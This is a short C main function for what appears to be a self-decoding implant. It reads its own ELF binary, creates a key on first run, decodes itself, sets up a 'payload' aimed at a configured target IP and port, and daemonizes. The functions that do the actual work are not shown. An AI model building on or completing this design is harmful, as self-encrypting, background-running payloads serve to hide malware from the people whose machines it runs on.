
#include "elf_utils.h"
#include "setup.h"

int main(int ac, char * const *av)
{
    elf_utils_t *utils = NULL;
    settings_t g_settings = {
        .logfd = 0,
        .sockfd = 0,
        .target_port = NULL,
        .target_ip = NULL,
    };

    parse_settings(ac, av, &g_settings);
    init(&g_settings);

    utils = elf_read(av[0]);
    if (!utils) {
        KILL("[!] Failure reading ELF\n");
        exit(1);
    } else if (is_first_time) {
        generate_first_time_key(utils);
        return 0;
    }

    elf_decode(utils);

    setup_payload(&g_settings);
    daemonize();
    return 0;
}
